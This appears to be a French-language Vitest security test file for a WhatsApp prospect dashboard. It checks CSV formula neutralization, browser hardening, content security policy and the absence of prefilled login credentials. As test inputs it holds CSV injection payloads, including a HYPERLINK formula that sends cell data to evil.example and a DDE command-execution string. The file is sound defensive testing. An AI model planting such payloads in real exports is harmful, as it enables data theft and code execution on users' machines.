import { readFileSync, readdirSync, existsSync, statSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";

const dashboard = path.resolve(__dirname, "../../../dashboard");
const read = (relative: string) => readFileSync(path.join(dashboard, relative), "utf8");

function listFiles(directory: string): string[] {
  return readdirSync(directory).flatMap((entry) => {
    const full = path.join(directory, entry);
    return statSync(full).isDirectory() ? listFiles(full) : [full];
  });
}

describe("tableau de bord : export CSV", () => {
  it("neutralise les formules qu'un client pourrait placer dans son nom WhatsApp", async () => {
    const csvModule = path.join(dashboard, "src/utils/csv.js");
    const { neutralizeFormula, buildProspectsCsv } = (await import(/* @vite-ignore */ csvModule)) as { neutralizeFormula: (text: string) => string; buildProspectsCsv: (rows: unknown[]) => string };
    for (const dangerous of ['=HYPERLINK("http://evil.example/?d="&A2;"x")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1+1)", "\t=1+1", "  =1+1"]) {
      expect(neutralizeFormula(dangerous), dangerous).toBe(`'${dangerous}`);
    }
    // Les numéros de téléphone et le texte normal ne sont pas modifiés.
    for (const safe of ["+237 690 00 00 00", "237690000000", "Awa Mbarga", "Besoin : -10 % sur les sacs", "12 000 FCFA"]) {
      expect(neutralizeFormula(safe), safe).toBe(safe);
    }
    const csv = buildProspectsCsv([{ createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), qualificationStatus: "NOT_QUALIFIED", contact: { displayName: '=HYPERLINK("http://evil.example")', whatsappJid: "237690000000@s.whatsapp.net" } }]);
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example"")"`);
    expect(csv).not.toMatch(/(^|;)"=HYPERLINK/m);
  });
});

describe("tableau de bord : protections du navigateur", () => {
  it("n'envoie plus l'adresse du serveur depuis le stockage du navigateur", () => {
    const config = read("src/config.js");
    expect(config).not.toMatch(/localStorage\.getItem\(APP_CONFIG\.localStorageKeys\.apiBase\)/);
    expect(config).toMatch(/typeof window\.API_BASE_URL === "string"/);
  });

  it("n'a plus l'ancien tableau de bord sans échappement", () => {
    expect(existsSync(path.join(dashboard, "app.js"))).toBe(false);
  });

  it("n'utilise ni window.prompt (mot de passe visible), ni javascript:, ni gestionnaire d'événement en ligne", () => {
    const sources = listFiles(path.join(dashboard, "src")).filter((file) => /\.(js|html)$/.test(file));
    for (const file of sources) {
      const text = readFileSync(file, "utf8");
      const name = path.relative(dashboard, file);
      expect(text, `${name} : window.prompt`).not.toMatch(/window\.prompt\(/);
      expect(text, `${name} : javascript:`).not.toMatch(/javascript:/i);
      expect(text, `${name} : gestionnaire en ligne`).not.toMatch(/\son(click|error|load|submit|change)\s*=\s*["']/i);
    }
  });

  it("déclare une politique de contenu stricte, sans script en ligne, et autorise l'adresse du serveur configurée", () => {
    const config = read("src/config.js");
    const api = /defaultApi:\s*"([^"]+)"/.exec(config)?.[1];
    expect(api).toBeTruthy();
    for (const page of ["index.html", "app/index.html", ]) {
      const html = read(page);
      const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)?.[1] ?? "";
      expect(csp, page).toContain("script-src 'self'");
      expect(csp, page).not.toMatch(/script-src[^;]*'unsafe-(inline|eval)'/);
      expect(csp, page).toContain("object-src 'none'");
      expect(csp, page).toContain("base-uri 'none'");
      // Aucun <script> en ligne (les blocs de données JSON-LD ne s'exécutent pas).
      expect(html.match(/<script(?![^>]*\bsrc=)(?![^>]*application\/ld\+json)[^>]*>/gi) ?? [], page).toEqual([]);
    }
    for (const page of ["index.html", "app/index.html"]) {
      expect(/http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(read(page))?.[1], page).toContain(api!);
    }
  });
});

describe("tableau de bord React : aucun identifiant préremplis", () => {
  it("la page de connexion démarre vide", () => {
    const page = readFileSync(path.resolve(__dirname, "../../../dashboard-react/src/features/auth/LoginPage.jsx"), "utf8");
    expect(page).toMatch(/DEFAULT_CREDENTIALS = \{ email: '', password: '' \}/);
    expect(page).not.toMatch(/admin@brayano\.ai/);
  });
});
